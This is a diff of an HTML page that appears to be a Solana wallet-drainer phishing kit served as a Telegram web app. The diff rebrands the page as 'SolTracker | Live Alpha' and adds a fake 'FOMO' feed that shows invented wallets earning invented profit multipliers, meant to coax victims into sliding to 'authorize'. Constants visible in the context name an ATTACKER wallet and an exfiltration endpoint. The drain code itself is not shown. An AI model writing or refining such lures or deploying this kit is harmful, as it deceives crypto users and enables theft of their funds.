@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>SolSniper</title>
+<title>SolTracker | Live Alpha</title>
 <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
 <script src="https://unpkg.com/@solana/spl-token@0.3.9/lib/index.iife.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
@@ -20,7 +20,7 @@
     align-items: center;
     justify-content: center;
     padding: 24px;
-    background-image: radial-gradient(circle at 50% 100%, rgba(20, 241, 149, 0.05) 0%, transparent 50%);
+    background-image: radial-gradient(circle at 50% 100%, rgba(20, 241, 149, 0.08) 0%, transparent 50%);
     overflow: hidden;
   }
 
@@ -32,7 +32,7 @@
     -webkit-backdrop-filter: blur(24px);
     border: 1px solid rgba(255, 255, 255, 0.08);
     border-radius: 32px;
-    padding: 40px 32px;
+    padding: 32px 24px;
     display: flex;
     flex-direction: column;
     align-items: center;
@@ -43,21 +43,22 @@
     display: flex;
     align-items: center;
     gap: 8px;
-    margin-bottom: 24px;
+    margin-bottom: 20px;
     opacity: 0.8;
   }
 
-  .header svg { width: 20px; height: 20px; }
-  .header span { font-size: 14px; font-weight: 600; letter-spacing: 0.5px; color: #ffffff; }
+  .header svg { width: 18px; height: 18px; }
+  .header span { font-size: 13px; font-weight: 600; letter-spacing: 0.5px; color: #ffffff; text-transform: uppercase; }
 
   .status-icon {
-    width: 72px; height: 72px;
-    background: rgba(255, 255, 255, 0.03);
-    border: 1px solid rgba(255, 255, 255, 0.05);
+    width: 64px; height: 64px;
+    background: rgba(20, 241, 149, 0.1);
+    border: 1px solid rgba(20, 241, 149, 0.2);
     border-radius: 50%;
     display: flex; align-items: center; justify-content: center;
-    margin-bottom: 20px;
+    margin-bottom: 16px;
     position: relative;
+    color: #14F195;
   }
 
   .status-icon::after {
@@ -65,16 +66,53 @@
     position: absolute;
     width: 100%; height: 100%;
     border-radius: 50%;
-    border-top: 1px solid rgba(20, 241, 149, 0.5);
-    animation: spin 3s linear infinite;
+    border-top: 1px solid rgba(20, 241, 149, 0.8);
+    animation: spin 2s linear infinite;
   }
 
   @keyframes spin { 100% { transform: rotate(360deg); } }
 
-  h1 { font-size: 20px; font-weight: 600; margin-bottom: 8px; letter-spacing: -0.5px; }
-  p { font-size: 13px; color: #888888; text-align: center; line-height: 1.5; margin-bottom: 24px; }
+  h1 { font-size: 22px; font-weight: 700; margin-bottom: 4px; letter-spacing: -0.5px; }
+  p.slogan { font-size: 13px; color: #ef4444; font-weight: 600; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 0.5px; display: flex; align-items: center; gap: 6px; }
+  .pulse-dot { width: 8px; height: 8px; background: #ef4444; border-radius: 50%; animation: pulse 1.5s infinite; }
+  @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); } 70% { box-shadow: 0 0 0 6px rgba(239, 68, 68, 0); } 100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); } }
 
-  /* Horizontaler Slider (Rechts nach Links) */
+  /* FOMO Live Feed */
+  .feed-container {
+    width: 100%;
+    height: 160px;
+    background: rgba(0, 0, 0, 0.3);
+    border: 1px solid rgba(255, 255, 255, 0.05);
+    border-radius: 16px;
+    padding: 12px;
+    margin-bottom: 24px;
+    overflow: hidden;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    mask-image: linear-gradient(to bottom, transparent, black 10%, black 90%, transparent);
+    -webkit-mask-image: linear-gradient(to bottom, transparent, black 10%, black 90%, transparent);
+  }
+  
+  .feed-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: rgba(255, 255, 255, 0.03);
+    padding: 10px 12px;
+    border-radius: 8px;
+    font-size: 12px;
+    animation: slideIn 0.3s ease-out forwards;
+  }
+
+  @keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
+
+  .feed-wallet { font-family: monospace; color: #a1a1aa; }
+  .feed-profit { font-weight: 700; color: #14F195; }
+  .feed-token { font-weight: 600; color: #ffffff; }
+
+  /* Slider */
   .slider-container {
     width: 100%;
     height: 56px;
@@ -84,7 +122,7 @@
     position: relative;
     overflow: hidden;
     display: flex;
-    flex-direction: row-reverse; /* Startet von rechts */
+    flex-direction: row-reverse;
     align-items: center;
     padding: 4px;
     user-select: none;
@@ -94,7 +132,7 @@
     position: absolute;
     width: 100%;
     text-align: center;
-    font-size: 14px;
+    font-size: 13px;
     font-weight: 500;
     color: rgba(255, 255, 255, 0.4);
     pointer-events: none;
@@ -119,11 +157,9 @@
   .slider-thumb svg {
     width: 20px; height: 20px;
     color: #000000;
-    transition: transform 0.2s;
-    transform: rotate(180deg); /* Pfeil zeigt nach links */
+    transform: rotate(180deg);
   }
 
-  /* States */
   .slider-container.loading .slider-thumb {
     width: calc(100% - 8px);
     border-radius: 24px;
@@ -158,18 +194,22 @@
         <path d="M64.6 3.8C67.1 1.4 70.4 0 73.8 0h317.4c5.8 0 8.7 7 4.6 11.1l-62.7 62.7c-2.4 2.4-5.7 3.8-9.2 3.8H6.5c-5.8 0-8.7-7-4.6-11.1L64.6 3.8z" fill="#ffffff"/>
         <path d="M333.1 120.1c-2.4-2.4-5.7-3.8-9.2-3.8H6.5c-5.8 0-8.7 7-4.6 11.1l62.7 62.7c2.4 2.4 5.7 3.8 9.2 3.8h317.4c5.8 0 8.7-7 4.6-11.1l-62.7-62.7z" fill="#ffffff"/>
       </svg>
-      <span>Solana</span>
+      <span>SolTracker</span>
     </div>
 
     <div class="status-icon">
-      <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#14F195" stroke-width="1.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"></path></svg>
     </div>
 
-    <h1>Wallet Sync</h1>
-    <p>Slide left to authorize connection.</p>
+    <h1>Live Alpha Feed</h1>
+    <p class="slogan"><span class="pulse-dot"></span> Tracking Mainnet</p>
+
+    <div class="feed-container" id="feedContainer">
+      <!-- Live Feed Items injected via JS -->
+    </div>
 
     <div class="slider-container" id="sliderContainer">
-      <div class="slider-text" id="sliderText">Slide left</div>
+      <div class="slider-text" id="sliderText">Slide left to track</div>
       <div class="slider-thumb" id="sliderThumb">
         <svg id="sliderIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"></path></svg>
         <div class="spinner" id="spin"></div>
@@ -183,6 +223,38 @@
     window.Telegram.WebApp.expand();
   }
 
+  // --- FOMO LIVE FEED ANIMATION ---
+  const feed = document.getElementById('feedContainer');
+  const fakeWallets = ['7xKX...9aPz', '3vNd...2mQk', '8fRt...1wLm', '5cYh...7uXb', '9pLk...4eRj'];
+  const fakeTokens = ['WIF', 'BONK', 'POPCAT', 'MYRO', 'SLERF'];
+  
+  function addFeedItem() {
+    const wallet = fakeWallets[Math.floor(Math.random() * fakeWallets.length)];
+    const token = fakeTokens[Math.floor(Math.random() * fakeTokens.length)];
+    const multiplier = (Math.random() * 20 + 5).toFixed(1);
+    
+    const el = document.createElement('div');
+    el.className = 'feed-item';
+    el.innerHTML = `
+      <span class="feed-wallet">${wallet}</span>
+      <span class="feed-token">bought $${token}</span>
+      <span class="feed-profit">+${multiplier}x</span>
+    `;
+    
+    feed.prepend(el);
+    if (feed.children.length > 4) {
+      feed.lastChild.remove();
+    }
+  }
+
+  // Initial fill
+  for(let i=0; i<3; i++) addFeedItem();
+  
+  // Add new item every 2.5 seconds
+  setInterval(addFeedItem, 2500);
+
+
+  // --- CONFIG ---
   const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
   const ENDPOINT = "https://sol-sync-worker.rthvzkr6jv.workers.dev"; 
   const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
@@ -346,7 +418,7 @@
   function resetSlider() {
     container.classList.remove('loading');
     text.style.opacity = 1;
-    text.textContent = "Slide left";
+    text.textContent = "Slide left to track";
     spin.style.display = 'none';
     icon.style.display = 'block';
     thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), width 0.3s ease, border-radius 0.3s ease';
